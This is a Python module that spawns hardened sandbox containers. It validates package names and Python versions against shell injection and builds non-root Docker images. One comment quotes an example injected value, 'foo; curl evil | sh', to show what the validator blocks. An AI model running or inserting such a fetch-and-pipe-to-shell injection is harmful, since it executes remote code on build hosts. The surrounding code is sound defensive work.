"""Shared container-spawning machinery (sandbox executor + docker provider).

Per-env image builds with RD-2 package validation, schema-versioned image
tags, the isolation-runtime probe, and the hardened ``containers.run``
keyword set live here so a hardening fix lands on every container Noodle
ever spawns. No DB access; safe to import from worker_main.
"""

from __future__ import annotations

import logging
import re
from typing import Any

from app.config import settings

logger = logging.getLogger(__name__)

# Bump whenever the generated Dockerfile changes shape — stale images built
# from the old recipe (e.g. root-running v1 images) must never be reused.
IMAGE_SCHEMA_VERSION = "v2"

# RD-2: ``ensure_docker_image`` interpolates the env's package list and Python
# version straight into a shell ``RUN uv pip install`` / ``FROM python:`` line in
# the generated Dockerfile. Shell metacharacters in a package name (e.g.
# ``"foo; curl evil | sh"``) would otherwise execute at build time. The env is
# admin-controlled (``environment:write``), but we validate as defence-in-depth.
# Each requirement is restricted to a PEP 508 name + optional extras + optional
# version specifiers using only characters that cannot break out of the shell
# word (no spaces, quotes, ``;``, ``|``, ``&``, ``$``, ``()``, backticks, …).
_PKG_SPEC_RE = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._-]*"                      # distribution name
    r"(\[[A-Za-z0-9._,-]+\])?"                          # optional extras
    r"((===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+"         # first version specifier
    r"(,(===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+)*)?$"   # further specifiers
)
_PY_VERSION_RE = re.compile(r"^[0-9]+(\.[0-9]+){0,2}$")


def _validate_packages(packages: list[str]) -> list[str]:
    """Return the validated package specifiers or raise ``ValueError`` (RD-2)."""
    safe: list[str] = []
    for raw in packages:
        spec = str(raw).strip()
        if not spec:
            continue
        if not _PKG_SPEC_RE.match(spec):
            raise ValueError(
                f"invalid package specifier {spec!r}: only PEP 508 name/extras/"
                "version specifiers are allowed (no shell metacharacters)"
            )
        safe.append(spec)
    return safe


def _validate_python_version(version: str) -> str:
    """Return a validated ``X[.Y[.Z]]`` Python version or raise ``ValueError`` (RD-2)."""
    v = str(version or "").strip()
    if not _PY_VERSION_RE.match(v):
        raise ValueError(f"invalid python_version {version!r}: expected e.g. '3.12'")
    return v


# Spawn kwargs every Noodle-launched container gets. Resource ceilings are
# overridable (per runner-pool provider_config, later per org_limits); the
# security floor — cap_drop / no-new-privileges / read-only rootfs — is not.
_OVERRIDABLE = ("mem_limit", "nano_cpus", "pids_limit", "tmpfs", "network")


def hardening_kwargs(
    *, runtime: str, network: str, overrides: dict | None = None
) -> dict[str, Any]:
    kw: dict[str, Any] = {
        "cap_drop": ["ALL"],
        "security_opt": ["no-new-privileges:true"],
        "read_only": True,
        "tmpfs": {"/tmp": f"size={settings.sandbox_tmpfs_size}"},
        "mem_limit": settings.sandbox_mem_limit,
        "nano_cpus": int(settings.sandbox_cpu_limit * 1_000_000_000),
        "pids_limit": settings.sandbox_pids_limit,
        "network": network,
        "runtime": runtime,
        # rootfs is read-only; /tmp is the only writable surface.
        "environment": {"HOME": "/tmp"},
    }
    for key, value in (overrides or {}).items():
        if key in _OVERRIDABLE:
            kw[key] = value
    return kw


def ensure_sandbox_network(client: Any, name: str | None = None) -> str:
    """Get-or-create the dedicated bridge network. Handles the two-workers-
    racing-to-create case by re-checking after a failed create."""
    name = name or settings.sandbox_network
    try:
        client.networks.get(name)
        return name
    except Exception:  # noqa: BLE001 — NotFound
        pass
    try:
        client.networks.create(name, driver="bridge")
        return name
    except Exception as exc:  # noqa: BLE001 — possibly a concurrent create
        try:
            client.networks.get(name)
            return name
        except Exception:  # noqa: BLE001
            raise RuntimeError(
                f"could not create sandbox network {name!r}: {exc}"
            ) from exc


def image_tag_for(env_payload: dict) -> str:
    return (
        f"noodle-env:{env_payload.get('id', 'default')}"
        f"-{env_payload.get('packages_hash', 'latest')}"
        f"-{IMAGE_SCHEMA_VERSION}"
    )


_RUNTIME_PREFERENCE = ("kata", "runsc", "runc")  # strongest first
_VALID_RUNTIMES = ("auto", "runc", "runsc", "kata")


def detect_runtime(client: Any, configured: str) -> str:
    """Resolve the isolation runtime for this daemon. Sync — call at startup.

    Explicit values fail fast when the daemon doesn't list them; ``auto``
    picks the strongest available. ``runc`` is the daemon default and is
    treated as always present (some daemons omit it from info()).
    """
    if configured not in _VALID_RUNTIMES:
        raise ValueError(
            f"invalid sandbox_runtime={configured!r}: expected one of {_VALID_RUNTIMES}"
        )
    info = client.info() or {}
    available = set((info.get("Runtimes") or {}).keys()) | {"runc"}
    if configured != "auto":
        if configured not in available:
            raise RuntimeError(
                f"sandbox_runtime={configured!r} is not installed on this Docker "
                f"daemon (available: {sorted(available)}). Install it or use 'auto'."
            )
        return configured
    for candidate in _RUNTIME_PREFERENCE:
        if candidate in available:
            return candidate
    return "runc"


def ensure_docker_image(client: Any, image_tag: str, env_payload: dict) -> None:
    """Build the env image if absent. Sync — call via run_in_executor."""
    try:
        client.images.get(image_tag)
        return  # cache hit
    except Exception:  # noqa: BLE001 — NotFound; build below
        pass

    python_version = _validate_python_version(env_payload.get("python_version", "3.12"))
    packages = _validate_packages(env_payload.get("packages") or [])
    packages_str = " ".join(packages)
    install_line = (
        f"RUN uv pip install --system noodle-runtime noodle-nodes noodle-core "
        f"{packages_str}".rstrip()
    )

    # Non-root: installs run as root, the runtime does not. HOME is /tmp at
    # runtime (tmpfs) because the rootfs — including /home — is read-only.
    dockerfile = (
        f"FROM python:{python_version}-slim\n"
        "RUN pip install uv --quiet\n"
        f"{install_line}\n"
        "RUN useradd --uid 65532 --create-home --shell /usr/sbin/nologin noodle\n"
        "USER noodle\n"
        'ENTRYPOINT ["python", "-u", "-m", "noodle_runtime"]\n'
    )

    import io  # noqa: PLC0415

    client.images.build(fileobj=io.BytesIO(dockerfile.encode()), tag=image_tag, rm=True)
    logger.info("built docker image %s", image_tag)
